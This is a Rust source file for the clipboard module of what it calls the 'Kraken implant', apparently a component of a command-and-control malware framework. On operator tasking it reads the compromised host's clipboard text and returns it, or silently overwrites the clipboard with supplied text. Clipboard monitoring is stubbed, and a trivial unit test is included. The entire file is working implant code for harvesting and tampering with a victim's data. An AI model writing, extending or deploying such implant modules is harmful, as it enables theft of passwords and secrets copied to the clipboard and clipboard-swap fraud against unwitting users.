//! mod-clipboard: Clipboard operations module for Kraken implant
//!
//! Provides get and set operations for system clipboard content.

use common::{ClipboardEntry, ClipboardOutput, KrakenError, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::{clipboard_task, ClipboardTask};

mod ops;

pub struct ClipboardModule {
    id: ModuleId,
}

impl ClipboardModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("clipboard"),
        }
    }
}

impl Default for ClipboardModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for ClipboardModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Clipboard"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: ClipboardTask = ClipboardTask::decode(task_data)
            .map_err(|e| KrakenError::Protocol(e.to_string()))?;

        match task.operation {
            Some(clipboard_task::Operation::Get(_)) => {
                let text = ops::get_clipboard_text()?;
                let result = ClipboardOutput {
                    entries: vec![ClipboardEntry {
                        text,
                        format: "CF_UNICODETEXT".to_string(),
                    }],
                };
                Ok(TaskResult::Clipboard(result))
            }
            Some(clipboard_task::Operation::Set(set)) => {
                ops::set_clipboard_text(&set.text)?;
                Ok(TaskResult::Success)
            }
            Some(clipboard_task::Operation::MonitorStart(_)) => {
                Err(KrakenError::Module(
                    "clipboard monitoring not implemented in stateless mode".into(),
                ))
            }
            Some(clipboard_task::Operation::MonitorStop(_)) => {
                Err(KrakenError::Module(
                    "clipboard monitoring not implemented in stateless mode".into(),
                ))
            }
            Some(clipboard_task::Operation::Dump(_)) => {
                // Dump is equivalent to get for stateless mode
                let text = ops::get_clipboard_text()?;
                let result = ClipboardOutput {
                    entries: vec![ClipboardEntry {
                        text,
                        format: "CF_UNICODETEXT".to_string(),
                    }],
                };
                Ok(TaskResult::Clipboard(result))
            }
            None => Err(KrakenError::Protocol("missing clipboard operation".into())),
        }
    }
}

#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(ClipboardModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = ClipboardModule::new();
        assert_eq!(module.id().as_str(), "clipboard");
        assert_eq!(module.name(), "Clipboard");
    }
}
